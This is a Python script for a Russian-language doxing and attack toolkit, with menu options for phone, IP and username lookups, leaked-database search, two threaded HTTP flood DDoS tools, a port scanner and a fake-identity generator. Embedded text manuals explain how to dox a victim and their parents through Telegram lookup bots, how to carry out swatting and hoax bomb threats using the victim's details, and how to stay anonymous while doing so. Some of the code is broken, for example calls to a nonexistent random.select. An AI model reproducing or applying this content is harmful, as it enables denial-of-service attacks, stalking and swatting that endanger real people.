from colorama import init, Fore, Style
import requests
import time
import random
from fake_useragent import UserAgent
from datetime import datetime
import platform
import socket
import datetime
from termcolor import colored
import platform
import os
os.system("pip install pystyle phonenumbers requests whois python-whois py-whois pywhois pythonwhois colorama")
import socket
import pystyle
import phonenumbers, phonenumbers.timezone, phonenumbers.carrier, phonenumbers.geocoder
import requests
import whois
import colorama
import threading
import string
import faker
import bs4
import urllib.parse
import colorama
import concurrent.futures
import csv
import os
import webbrowser
import urllib.parse
import select

def open_link():
    url = "https://t.me/xexdoxbin"
    system = platform.system()

    if system == "Linux":
        if "com.termux" in os.getenv("PREFIX", ""):
            os.system(f'am start -a android.intent.action.VIEW -d "{url}"')
        else:
            webbrowser.open(url)
    elif system == "Windows":
        webbrowser.open(url)
    else:
        pass
open_link()


if platform.system() == "Windows":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 3)
    enter = pystyle.Colorate.Horizontal(pystyle.Colors.white_to_black, (""))
    pystyle.Anime.Fade(
    pystyle.Center.Center('''  

 /$$    /$$                              /$$$$$$$$           /$$          
| $$   | $$                             |_____ $$           |__/          
| $$   | $$ /$$$$$$   /$$$$$$   /$$$$$$      /$$/  /$$$$$$$  /$$  /$$$$$$$
|  $$ / $$/|____  $$ /$$__  $$ /$$__  $$    /$$/  | $$__  $$| $$ /$$_____/
 \  $$ $$/  /$$$$$$$| $$  \ $$| $$$$$$$$   /$$/   | $$  \ $$| $$| $$      
  \  $$$/  /$$__  $$| $$  | $$| $$_____/  /$$/    | $$  | $$| $$| $$      
   \  $/  |  $$$$$$$| $$$$$$$/|  $$$$$$$ /$$$$$$$$| $$  | $$| $$|  $$$$$$$
    \_/    \_______/| $$____/  \_______/|________/|__/  |__/|__/ \_______/
                    | $$                                                  
                    | $$                                                  
                    |__/                                                  
                          
                            Welcome to XexWork TOOL, Press "ENTER" to continue !'''), pystyle.Colors.purple_to_red, pystyle.Colorate.Vertical, enter=True)
def Main():
    if platform.system() == "Windows":
        os.system("cls")
        pystyle.Write.Print(pystyle.Center.XCenter('''\n

 /$$    /$$                              /$$$$$$$$           /$$          
| $$   | $$                             |_____ $$           |__/          
| $$   | $$ /$$$$$$   /$$$$$$   /$$$$$$      /$$/  /$$$$$$$  /$$  /$$$$$$$
|  $$ / $$/|____  $$ /$$__  $$ /$$__  $$    /$$/  | $$__  $$| $$ /$$_____/
 \  $$ $$/  /$$$$$$$| $$  \ $$| $$$$$$$$   /$$/   | $$  \ $$| $$| $$      
  \  $$$/  /$$__  $$| $$  | $$| $$_____/  /$$/    | $$  | $$| $$| $$      
   \  $/  |  $$$$$$$| $$$$$$$/|  $$$$$$$ /$$$$$$$$| $$  | $$| $$|  $$$$$$$
    \_/    \_______/| $$____/  \_______/|________/|__/  |__/|__/ \_______/
                    | $$                                                  
                    | $$                                                  
                    |__/                                                  
РАЗРАБОТЧИК: @xexcoding\n'''), pystyle.Colors.white, interval = 0.001)
    else:
        os.system("clear")
        pystyle.Write.Print(pystyle.Center.XCenter('''\n

 /$$    /$$                              /$$$$$$$$           /$$          
| $$   | $$                             |_____ $$           |__/          
| $$   | $$ /$$$$$$   /$$$$$$   /$$$$$$      /$$/  /$$$$$$$  /$$  /$$$$$$$
|  $$ / $$/|____  $$ /$$__  $$ /$$__  $$    /$$/  | $$__  $$| $$ /$$_____/
 \  $$ $$/  /$$$$$$$| $$  \ $$| $$$$$$$$   /$$/   | $$  \ $$| $$| $$      
  \  $$$/  /$$__  $$| $$  | $$| $$_____/  /$$/    | $$  | $$| $$| $$      
   \  $/  |  $$$$$$$| $$$$$$$/|  $$$$$$$ /$$$$$$$$| $$  | $$| $$|  $$$$$$$
    \_/    \_______/| $$____/  \_______/|________/|__/  |__/|__/ \_______/
                    | $$                                                  
                    | $$                                                  
                    |__/                                                  
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
                    разработчик @xexcoding
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ \n'''), pystyle.Colors.white, interval = 0.001)
    pystyle.Write.Print(pystyle.Center.XCenter('''\n
[1] Поиск по номеру  
[2] Поиск по сайту    
[3] Поиск по нику    
[4] Поиск по IP       
[5] Поиск по БД       
[6] DDoS 1.0          
[7] Генератор прокси   
[8] Св@t б@нв0рD   
[9] Генератор паролей  
[10] Мануал по доксу                 
[11] Мануал по свату 
[12] Мануал по анонимности
[13] Порт сканер
[14] Генератор вымышленной личности
[15] Web-crawler
[16] DDOS 2.0
[17] Генератор карт
[18] Поиск по Mac-Address     
[19] Мануал по сносу аккаунта тг
[20] Генератор User-agent'a        
[21] Информация       
[22] Создатель
[23] Выход
'''), pystyle.Colors.white, interval = 0.001)
Main()
while True:
    select = pystyle.Write.Input("\n\n[?] Выберите пункт меню: ", pystyle.Colors.white, interval = 0.001)
    if select == "1":
        phone = pystyle.Write.Input("\n[?] Введите номер телефона -> ", pystyle.Colors.white, interval = 0.001)
        def phoneinfo(phone):
            try:
                parsed_phone = phonenumbers.parse(phone, None)
                if not phonenumbers.is_valid_number(parsed_phone):
                    return pystyle.Write.Print(f"\n[!] Произошла ошибка -> Недействительный номер телефона\n", pystyle.Colors.white, interval=0.005)
                carrier_info = phonenumbers.carrier.name_for_number(parsed_phone, "en")
                country = phonenumbers.geocoder.description_for_number(parsed_phone, "en")
                region = phonenumbers.geocoder.description_for_number(parsed_phone, "ru")
                formatted_number = phonenumbers.format_number(parsed_phone, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
                is_valid = phonenumbers.is_valid_number(parsed_phone)
                is_possible = phonenumbers.is_possible_number(parsed_phone)
                timezona = phonenumbers.timezone.time_zones_for_number(parsed_phone)
                print_phone_info = f"""\n[+] Номер телефона -> {formatted_number}
[+] Страна -> {country}
[+] Регион -> {region}
[+] Оператор -> {carrier_info}
[+] Активен -> {is_possible}
[+] Валид -> {is_valid}
[+] Таймзона -> {timezona}
[+] Telegram -> https://t.me/{phone}
[+] Whatsapp -> https://wa.me/{phone}
[+] Viber -> https://viber.click/{phone}\n"""
                pystyle.Write.Print(print_phone_info, pystyle.Colors.white, interval=0.005)
            except Exception as e:
                pystyle.Write.Print(f"\n[!] Произошла ошибка -> {str(e)}\n", pystyle.Colors.white, interval=0.005)
        phoneinfo(phone)
    if select == "2":
        domain = pystyle.Write.Input("\n[?] Введите сайт -> ", pystyle.Colors.white, interval = 0.005)
        def get_website_info(domain):
            domain_info = whois.whois(domain)
            print_string = f"""
[+] Домен: {domain_info.domain_name}
[+] Зарегистрирован: {domain_info.creation_date}
[+] Истекает: {domain_info.expiration_date}  
[+] Владелец: {domain_info.registrant_name}
[+] Организация: {domain_info.registrant_organization}
[+] Адрес: {domain_info.registrant_address}
[+] Город: {domain_info.registrant_city}
[+] Штат: {domain_info.registrant_state}
[+] Почтовый индекс: {domain_info.registrant_postal_code}
[+] Страна: {domain_info.registrant_country}
[+] IP-адрес: {domain_info.name_servers}
"""
            pystyle.Write.Print(print_string, pystyle.Colors.white, interval=0.005)
        get_website_info(domain)
    if select == "3":
        nick = pystyle.Write.Input(f"\n[?] Введите никнейм -> ", pystyle.Colors.white, interval=0.005)
        urls = [
            f"https://www.instagram.com/{nick}",
            f"https://www.tiktok.com/@{nick}",
            f"https://twitter.com/{nick}",
            f"https://www.facebook.com/{nick}",
            f"https://www.youtube.com/@{nick}",
            f"https://t.me/{nick}",
            f"https://www.roblox.com/user.aspx?username={nick}",
            f"https://www.twitch.tv/{nick}",
        ]
        for url in urls:
            try:
                response = requests.get(url)
                if response.status_code == 200:
                    pystyle.Write.Print(f"\n{url} - аккаунт найден", pystyle.Colors.white, interval=0.005)
                elif response.status_code == 404:
                    pystyle.Write.Print(f"\n{url} - аккаунт не найден", pystyle.Colors.white, interval=0.005)
                else:
                    pystyle.Write.Print(f"\n{url} - ошибка {response.status_code}", pystyle.Colors.white, interval=0.005)
            except:
                pystyle.Write.Print(f"\n{url} - ошибка при проверке", pystyle.Colors.white, interval=0.005)
        print()
    if select == "4":
        ip = pystyle.Write.Input("\n[?] Введите IP-адрес -> ", pystyle.Colors.white, interval = 0.005)
        def ip_lookup(ip):
            url = f"http://ip-api.com/json/{ip}"
            try:
                response = requests.get(url)
                data = response.json()
                if data.get("status") == "fail":
                    pystyle.Write.Print(f"[!] Произошла ошибка: {data['message']}\n", pystyle.Colors.white, interval=0.005)
                info = ""
                for key, value in data.items():
                    info += f"[+] {key}: {value}\n"
                return info
            except Exception as e:
                pystyle.Write.Print(f"[!] Произошла ошибка: {str(e)}\n", pystyle.Colors.white, interval=0.005)
        print()
        pystyle.Write.Print(ip_lookup(ip), pystyle.Colors.white, interval=0.005)
    if select == "5":
        path = pystyle.Write.Input("\n[?] Введите путь к БД: ", pystyle.Colors.white, interval=0.005)
        search_text = pystyle.Write.Input("\n[?] Введите текст:  ", pystyle.Colors.white, interval=0.005)
        print()
        try:
            with open(path, "r", encoding="utf-8") as f:
                for line in f:
                    if search_text in line:
                        pystyle.Write.Print("[+] Результат: " + line.strip(), pystyle.Colors.white, interval=0.005)
                        print()
                        break
                else:
                    pystyle.Write.Print("[!] Текст не найден.\n", pystyle.Colors.white, interval=0.005)
        except:
            try:
                with open(path, "r", encoding="cp1251") as f:
                    for line in f:
                        if search_text in line:
                            pystyle.Write.Print("[+] Результат: " + line.strip(), pystyle.Colors.white, interval=0.005)
                            print()
                            break
                    else:
                        pystyle.Write.Print("[!] Текст не найден.\n", pystyle.Colors.white, interval=0.005)
            except:
                try:
                    with open(path, "r", encoding="cp1252") as f:
                        for line in f:
                            if search_text in line:
                                pystyle.Write.Print("[+] Результат: " + line.strip(), pystyle.Colors.white, interval=0.005)
                                print()
                                break
                        else:
                            pystyle.Write.Print("[!] Текст не найден.\n", pystyle.Colors.white, interval=0.005)
                except:
                    pystyle.Write.Print(f"[!] Произошла ошибка, проверьте ввод данных\n", pystyle.Colors.white, interval=0.005)
    if select == "6":
        url = pystyle.Write.Input("[?] URL: ", pystyle.Colors.white, interval=0.005)
        num_requests = int(
            pystyle.Write.Input(
                "[?] Введите количество запросов: ", pystyle.Colors.white, interval=0.005
            )
        )
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
        ]
        def send_request(i):
            user_agent = random.select(user_agents)
            headers = {"User-Agent": user_agent}
            try:
                response = requests.get(url, headers=headers)
                print(f"{colorama.Fore.white}[+] Request {i} sent successfully\n")
            except:
                print(f"{colorama.Fore.white}[+] Request {i} sent suc21cessfully\n")
        threads = []
        for i in range(1, num_requests + 1):
            t = threading.Thread(target=send_request, args=[i])
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
    if select == "7":
        def get_proxy():
            proxy_api_url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"

            try:
                response = requests.get(proxy_api_url)
                if response.status_code == 200:
                    proxy_list = response.text.strip().split("\r\n")
                    return proxy_list
                else:
                    pystyle.Write.Print(f"\nПроизошла ошибка -> {response.status_code}", pystyle.Colors.white, interval=0.005)
            except Exception as e:
                pystyle.Write.Print(f"\nПроизошла ошибка -> {str(e)}", pystyle.Colors.white, interval=0.005)

            return None

        proxies = get_proxy()
        if proxies:
            pystyle.Write.Print("\nПрокси:\n", pystyle.Colors.white, interval=0.005)
            for proxy in proxies:
                pystyle.Write.Print("\n" + proxy, pystyle.Colors.white, interval=0.005)
            print()
        else:
            pystyle.Write.Print("Прокси недоступно.", pystyle.Colors.white, interval=0.005)
    if select == "8":
        def transform_text(input_text):
            translit_dict = {
                "а": "@",
                "б": "Б",
                "в": "B",
                "г": "г",
                "д": "д",
                "е": "е",
                "ё": "ё",
                "ж": "ж",
                "з": "3",
                "и": "u",
                "й": "й",
                "к": "K",
                "л": "л",
                "м": "M",
                "н": "H",
                "о": "0",
                "п": "п",
                "р": "P",
                "с": "c",
                "т": "T",
                "у": "y",
                "ф": "ф",
                "х": "X",
                "ц": "ц",
                "ч": "4",
                "ш": "ш",
                "щ": "щ",
                "ъ": "ъ",
                "ы": "ы",
                "ь": "ь",
                "э": "э",
                "ю": "ю",
                "я": "я",
                "А": "A",
                "Б": "6",
                "В": "V",
                "Г": "r",
                "Д": "D",
                "Е": "E",
                "Ё": "Ё",
                "Ж": "Ж",
                "З": "2",
                "И": "I",
                "Й": "Й",
                "К": "K",
                "Л": "Л",
                "М": "M",
                "Н": "H",
                "О": "O",
                "П": "П",
                "Р": "P",
                "С": "C",
                "Т": "T",
                "У": "Y",
                "Ф": "Ф",
                "Х": "X",
                "Ц": "Ц",
                "Ч": "Ч",
                "Ш": "Ш",
                "Щ": "Щ",
                "Ъ": "Ъ",
                "Ы": "bl",
                "Ь": "b",
                "Э": "Э",
                "Ю": "9Y",
                "Я": "9A",
            }
            transformed_text = []
            for char in input_text:
                if char in translit_dict:
                    transformed_text.append(translit_dict[char])
                else:
                    transformed_text.append(char)
            return "".join(transformed_text)
        input_text = pystyle.Write.Input("\n[?] Введите текст -> ", pystyle.Colors.white, interval=0.005)
        transformed_text = transform_text(input_text)
        print()
        pystyle.Write.Print("[+] Результат -> " + transformed_text + "\n", pystyle.Colors.white, interval=0.005)
    if select == "9":
        def get_characters(complexity):
            characters = string.ascii_letters + string.digits
            if complexity == "medium":
                characters += "!@#$%^&*()"
            elif complexity == "high":
                characters += string.punctuation
            return characters
        def generate_password(length, complexity):
            characters = get_characters(complexity)
            password = "".join(random.select(characters) for i in range(length))
            return password
        password_length = int(
            pystyle.Write.Input("[?] Введите длину пароля -> ", pystyle.Colors.white, interval=0.005)
        )
        complexity = pystyle.Write.Input(
            "[?] Выберите сложность (low, medium, high): ", pystyle.Colors.white, interval=0.005)
        print()
        complex_password = generate_password(password_length, complexity)
        pystyle.Write.Print("[+] Пароль -> "+ complex_password + "\n", pystyle.Colors.white, interval=0.005)
    if select == "10":
        pystyle.Write.Print('''\nВ этом руководстве я подробно опишу, как найти практически любого человека, который не обеспечен должным уровнем защиты в интернете. Этот метод будет полезен для новичков, хотя профессионалы могут найти его недостаточно сложным. Руководство будет основано на легком, но эффективном проникновении через ботов, ссылки на которых я предоставлю в самом низу.

Итак, приступим. У нас есть аккаунт в Telegram - это все, что нам нужно. Основная цель - получить номер телефона или хотя бы имя и область/город. Как мы это делаем? В Telegram существуют боты-сервисы, способные предоставить вам номер телефона практически любого аккаунта в этой платформе. Вот список таких ботов:

1. Глаз Бога
2. Quick Osint
3. GtaSearch
4. BlackatSearch
5. Криптоскан
6. Telegram Analyst
7. Leak Osint 

Получили номер. Затем используем сочетание трех ботов - Универсал, Глаз Бога и Юзерсбокс. Заходим в Глаз Бога и начинаем поиск...

Теперь у нас есть два варианта развития событий, и я рассмотрю наиболее сложный.

Допустим, мы нашли только регион проживания жертвы, страну, имя и фамилию. Что дальше? Перепроверяем, используя Универсал, который предоставляет информацию о социальных сетях, зарегистрированных на этот номер телефона. Мы убеждаемся в правильности фамилии и имени, а иногда даже отчества.

Так. Мы получили правдоподобную информацию, включающую имя, фамилию и регион жертвы. Мы вводим эти данные в Юзерсбокс и ищем. Получаем результаты, включающие либо саму жертву, либо список людей с подобными данными. Как найти нужного? Ориентируемся на возраст и адрес. Затем снова обращаемся к Универсалу и проверяем результаты, ища подтверждение в виде даты рождения или города. Нашли. Получаем следующие данные:

Зузурин Михаил, 12.12.2008, Краснодарский край.

Вводим их также в Юзерсбокс и ищем, находим номер или несколько, просматриваем их и собираем информацию. Затем проверяем ФИО + дату рождения в Глазе Бога, где находим еще больше информации и добавляем ее в текстовый файл, придавая всему свой стиль.

Теперь, допустим, вы нашли саму жертву, но нужно найти его родителей? Не проблема. В процессе поиска жертвы мы однозначно получили часть данных о ее отце. Что у нас есть:

Зузурин Михаил Александрович, 12.12.2008, Краснодарский край.

Что мы делаем? Ищем: Зузурин Александр, Краснодар. Далее все просто. Мы ищем и сверяем адрес с ранее найденным, также учитываем возраст. Отлично, Шерлок! Вы нашли отца. Зузурин Александр Николаевич, 15.04.1976. Проверяем ФИО и дату рождения в Юзерсбоксе и Глазе Бога, получаем результаты, пробивая их также по номеру.

Как найти мать? На основе найденной информации об отце мы получаем его номер, на который однозначно зарегистрирована какая-то социальная сеть. Достаем любую фотографию и отправляем ее в Глаз Бога в поисках VKонтakte. Мы находим профиль отца, где либо в подписках будет его жена, либо ее можно увидеть на аватарке. Затем проверяем либо найденный VK, либо фотографию жены, и снова пробиваем VK.

Как достать номер из VKонтakte? Существует три бота, которые могут это сделать:

1. VKHistory
2. Глаз Бога
3. Юзерсбокс

Ой, проблема. Нигде не удалось найти номер. Что делать? В профиле жены в VK указаны имя, фамилия, дата рождения, а также известен город проживания. Мы вводим эти данные в Юзерсбокс и ищем:

Зузурина Мария, 24.05.1978, Краснодар.

Находим информацию, начинаем проверять по номеру и записываем результаты.

Готово! Написано досье на жертву и ее родителей исключительно с использованием ботов в Telegram. Поздравляю!\n''', pystyle.Colors.white, interval = 0.005)
    if select == "11":
        pystyle.Write.Print('''\nДля начала требуется получить доступ к почтовым аккаунтам на mail.ru и proton.mail через соответствующие веб-сайты от имени жертвы. Подробности о процессе не требуются.

После завершения этого шага переходим в мессенджер Telegram и приобретаем виртуальные номера для protonMail или Mail.ru. Рекомендуемые боты, не склонные к утечке введенной информации и SMS, включают в себя @GreedySMSbot и @SMSBest_bot.

Затем, после приобретения виртуального номера, необходим хороший платный VPN и прокси. Рекомендуется использовать Mullvad VPN как наиболее надежный

После покупки виртуального номера для почты следует написать текст, который не попадет в спам. Лучше всего сформулировать его как руководство по "Swatting". Ниже представлен список инструментов, необходимых для успешной операции:

1. Операционная система Android.
2. Почтовый сервис Proton Mail.
3. Комбинация мультихоп VPN: Proton VPN и MullVad VPN.
4. Tor Browser с соответствующими плагинами или Firefox с плагинами.

Мультихоп представляет собой использование двух и более VPN одновременно на устройстве.

Шаги для подготовки:

1. Создание нового почтового ящика на Proton Mail.
2. Загрузка виртуальной машины на телефон.
3. Установка еще одной виртуальной машины внутри первой.
4. Загрузка MullVad VPN на телефон без виртуальной машины.
5. Установка того же VPN на первой виртуальной машине с выбором другого региона.
6. Загрузка Proton VPN на второй виртуальной машине.
7. Загрузка Tor Browser или Firefox с плагинами на последнюю виртуальную машину.
8. Посещение сайта Proton Mail для более безопасного использования.
9. Настройка браузера Firefox внутри виртуальной машины для обеспечения улучшенной защиты от отслеживания и удаления куки-файлов.

Для отправки электронной почты через Proton Mail рекомендуется включить антифрод (цензурирование определенных слов в письме).

После составления письма, которое будет привлекательным для получателя, рекомендуется отправить его не менее чем на 20 адресов электронной почты. Обязательно укажите контактные данные жертвы, такие как ФИО и номер телефона или карты.

Следите за временем и местоположением жертвы, избегайте отправки писем в неподходящее время, чтобы добиться наилучших результатов. При желании можно представляться любым человеком и заминировать любое здание. Указание контактных данных увеличит вероятность заинтересованности получателя.\n''', pystyle.Colors.white, interval = 0.005)
    if select == "12":
        pystyle.Write.Print('''\nРуководство по обеспечению анонимности

[Доксинг]

При вступлении в сообщество обезличивания, необходимо осознать дополнительные риски, поскольку следует помнить: найдется человек, способный разоблачить вас в кратчайшие сроки.

Анонимность в Telegram - базовый уровень. Она включает использование виртуальных номеров, однако стоит помнить, что эта услуга не обеспечит полной защиты из-за возможности сохранения логов. Поэтому рекомендуется искать поставщиков услуг с активными номерами и фальшивой информацией. Например, пользователя по имени "смолин" либо тех, кто рекламирует подобные услуги на своем телеграм-канале.

Этот раздел ориентирован на русскоязычных пользователей. Для украинцев проще: достаточно приобрести сим-карту Vodafone и зарегистрировать на нее исключительно аккаунт в Telegram.

Затем необходимо удалить свои данные из "глаза бога". Думаю, многие знакомы с этой процедурой. Но зачем она, если у вас чистый или виртуальный номер? Личность может начать поиски, уверенная, что ваш аккаунт содержит достоверную информацию. Это усложняет ее задачу при использовании популярных ботов для извлечения номеров, таких как Quick Osint, BlackatSearch, GTA, SmartSearch.

Кроме того, стоит учитывать следующие пять простых правил:

1. НИКОГДА не разглашайте личную информацию, используйте чужие имя, возраст, страну и город проживания, никаких подробностей.
2. НИКОГДА не передавайте свой номер телефона, даже если он чистый или виртуальный. Не отправляйте его ботам, включая "глаз бога". Многие боты могут использовать скрипты деанонимизации, запрашивая ваш контакт.
3. При покупке подписки в "глазе бога" используйте временную почту, например, через сервис TempMail, чтобы избежать утечки вашей почты.
4. Не используйте одинаковые имена пользователей для своих аккаунтов.
5. Используйте прокси. Некоторые участники сообщества создают сайты с IP-логгерами. Для предотвращения утечки местоположения и IP-адреса настройте прокси-сервер в Telegram и открывайте ссылки прямо в приложении Telegram или используйте VPN, если не уверены в настройках.

Анонимность в Telegram - это основа. Но что делать вне Telegram? Кроме Telegram существуют сообщества в VKontakte и Discord. Как обезопасить себя? Избегайте русскоязычные социальные сети и сервисы, так как они также могут подвергать вас риску утечки данных. VKontakte является одной из наименее безопасных социальных сетей. Рекомендуется удалить все свои личные аккаунты и отписаться от групп, связанных с родственниками, друзьями, школами или городами. Это не относится к Telegram. Очищайте аккаунты и затем удаляйте их.

[Swatting]

Анонимность в этом случае базируется на четырех основных компонентах: прокси-сервере, VPN, Tor-браузере и Linux.

Настройку Tor и Linux для анонимности можно найти на YouTube, так как это не секрет и в сети много подобных видеороликов.
VPN. Я лично использую Nord и Mullvad для сваттинга или лжеминирования. Важно использовать сразу два VPN для лучшей анонимности.
Прокси. Не используйте бесплатные прокси-сервера, купите платные, чтобы обеспечить полную безопасность.

Кроме того, для окончательной безопасности в сети при сваттинге или лжеминировании используйте не свой домашний Wi-Fi или мобильный интернет. Рекомендуется подключаться к бесплатной сети в кафе и использовать ее для незаконных действий.

!! ВАЖНО !!

При сваттинге или лжеминировании НИ ПО КАКИМ ОБСТОЯТЕЛЬСТВАМ НЕ ПОСЕЩАЙТЕ САЙТЫ, НА КОТОРЫХ МОЖЕТ БЫТЬ ВАША ЛИЧНАЯ ИНФОРМАЦИЯ. Включайте VPN только при регистрации почты для отправки писем, а затем отключайте его.

Отправили письмо - следуйте этим же шагам в правильной последовательности. Выйдите из Tor, Linux, а затем из VPN.\n''', pystyle.Colors.white, interval = 0.005)
    if select == '13':
        pystyle.Write.Print("\n[?] Выберите режим: ", pystyle.Colors.white, interval=0.005)
        pystyle.Write.Print("\n\n[?] 1 - проверить часто используемые порты", pystyle.Colors.white, interval=0.005)
        pystyle.Write.Print("\n\n[?] 2 - проверить указанный порт", pystyle.Colors.white, interval=0.005)
        mode = pystyle.Write.Input("\n\n[?] Ваш выбор: ", pystyle.Colors.white, interval=0.005)
        if mode == "1":
            print()
            ports = [
                20,
                26,
                28,
                29,
                55,
                53,
                80,
                110,
                443,
                8080,
                1111,
                1388,
                2222,
                1020,
                4040,
                6035,
            ]
            for port in ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = sock.connect_ex(("127.0.0.1", port))
                if result == 0:
                    pystyle.Write.Print(f"[+] Порт {port} открыт", pystyle.Colors.white, interval=0.005)
                else:
                    pystyle.Write.Print(f"[+] Порт {port} закрыт", pystyle.Colors.white, interval=0.005)
                sock.close()
                print()
        elif mode == "2":
            port = pystyle.Write.Input("\n[?] Введите номер порта: ", pystyle.Colors.white, interval=0.005)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(("127.0.0.1", int(port)))
            print()
            if result == 0:
                pystyle.Write.Print(f"[+] Порт {port} открыт", pystyle.Colors.white, interval=0.005)
            else:
                pystyle.Write.Print(f"[+] Порт {port} закрыт", pystyle.Colors.white, interval=0.005)
            sock.close()
            print()
        else:
            pystyle.Write.Print("\n[!] Неизвестный режим", pystyle.Colors.white, interval=0.005)
            print()
    if select == "14":
        fake = faker.Faker(locale="ru_RU")
        gender = pystyle.Write.Input("\n[?] Введите пол (М - мужской, Ж - женский): ", pystyle.Colors.white, interval=0.005)
        print()
        if gender not in ["М", "Ж"]:
            gender = random.select(["М", "Ж"])
            pystyle.Write.Print(f"[!] Вы ввели неверное значение, будет выбрано случайным образом: {gender}\n\n", pystyle.Colors.white, interval=0.005)
        if gender == "М":
            first_name = fake.first_name_male()
            middle_name = fake.middle_name_male()
        else:
            first_name = fake.first_name_female()
            middle_name = fake.middle_name_female()
        last_name = fake.last_name()
        full_name = f"{last_name} {first_name} {middle_name}"
        birthdate = fake.date_of_birth()
        age = fake.random_int(min=18, max=80)
        street_address = fake.street_address()
        city = fake.city()
        region = fake.region()
        postcode = fake.postcode()
        address = f"{street_address}, {city}, {region} {postcode}"
        email = fake.email()
        phone_number = fake.phone_number()
        inn = str(fake.random_number(digits=12, fix_len=True))
        snils = str(fake.random_number(digits=11, fix_len=True))
        passport_num = str(fake.random_number(digits=10, fix_len=True))
        passport_series = fake.random_int(min=1000, max=9999)
        pystyle.Write.Print(f"[+] ФИО: {full_name}\n", pystyle.Colors.white, interval=0.005)
        pystyle.Write.Print(f"[+] Пол: {gender}\n", pystyle.Colors.white, interval=0.005)
        pystyle.Write.Print(f"[+] Дата рождения: {birthdate.strftime('%d %B %Y')}\n", pystyle.Colors.white, interval=0.005)
        pystyle.Write.Print(f"[+] Возраст: {age} лет\n", pystyle.Colors.white, interval=0.005)
        pystyle.Write.Print(f"[+] Адрес: {address}\n", pystyle.Colors.white, interval=0.005)
        pystyle.Write.Print(f"[+] Email: {email}\n", pystyle.Colors.white, interval=0.005)
        pystyle.Write.Print(f"[+] Телефон: {phone_number}\n", pystyle.Colors.white, interval=0.005)
        pystyle.Write.Print(f"[+] ИНН: {inn}\n", pystyle.Colors.white, interval=0.005)
        pystyle.Write.Print(f"[+] СНИЛС: {snils}\n", pystyle.Colors.white, interval=0.005)
        pystyle.Write.Print(f"[+] Паспорт серия: {passport_series} номер: {passport_num}\n", pystyle.Colors.white, interval=0.005)
    if select == "15":
        start_url = pystyle.Write.Input("[?] Введите ссылку -> ", pystyle.Colors.white, interval=0.005)
        max_depth = 2
        visited = set()
        def crawl(url, depth=0):
            if depth > max_depth:
                return
            parsed = urllib.parse.urlparse(url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            if url in visited:
                return
            try:
                response = requests.get(url)
                html = response.text
                soup = bs4.BeautifulSoup(html, "html.parser")
            except:
                return
            visited.add(url)
            pystyle.Write.Print("[+] " + url + "\n", pystyle.Colors.white, interval=0.005)
            for link in soup.find_all("a"):
                href = link.get("href")
                if not href:
                    continue
                href = href.split("#")[0].rstrip("/")
                if href.startswith("http"):
                    href_parsed = urllib.parse.urlparse(href)
                    if href_parsed.netloc != parsed.netloc:
                        continue
                else:
                    href = domain + href
                crawl(href, depth + 1)
        print()
        crawl(start_url)
    if select == "16":
        def dos1():
            try:
                def generate_user_agent():
                    versions = [
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{0}; rv:{1}.0) Gecko/20{2:02d}{3:02d} Firefox/{1}.0",
                        "Mozilla/5.0 (X11; Linux x86_64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                    ]
                    version = random.randint(60, 90)
                    year = random.randint(10, 21)
                    month = random.randint(1, 12)
                    user_agent = random.select(versions).format(version, year, year, month)
                    return user_agent
                def make_request(url):
                    headers = {
                        'User-Agent': generate_user_agent()
                    }
                    response = requests.get(url, headers=headers)
                    print(f"\n{colorama.Fore.white}[{colorama.Fore.WHITE}+{colorama.Fore.white}]{colorama.Fore.MAGENTA} Атака началась, состояние сайта: ", response.status_code)
                def dos():
                    url = input(f"{colorama.Fore.white}[{colorama.Fore.WHITE}?{colorama.Fore.white}]{colorama.Fore.MAGENTA} Введите ссылку : ")
                    power = input(f"{colorama.Fore.white}[{colorama.Fore.WHITE}?{colorama.Fore.white}]{colorama.Fore.MAGENTA} Выберите режим (1 - Слабый/2 - Средний/3 - Мощный) : ")
                    if power == "1":
                        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
                            while True:
                                executor.submit(make_request, url)
                    elif power == "2":
                        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                            while True:
                                executor.submit(make_request, url)
                    elif power == "3":
                        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                            while True:
                                executor.submit(make_request, url)
                    else:
                        print(f"\n{colorama.Fore.white}[{colorama.Fore.WHITE}!{colorama.Fore.white}]{colorama.Fore.MAGENTA} Нет такого режима!")
                dos()
            except:
                print(f'\n{colorama.Fore.white}[{colorama.Fore.WHITE}!{colorama.Fore.white}]{colorama.Fore.MAGENTA} Произошла ошибка! Проверьте ввод данных!')
        dos1()
    if select == "17":
        pystyle.Write.Print("\n[?] Выберите страну:\n", pystyle.Colors.white, interval=0.005)
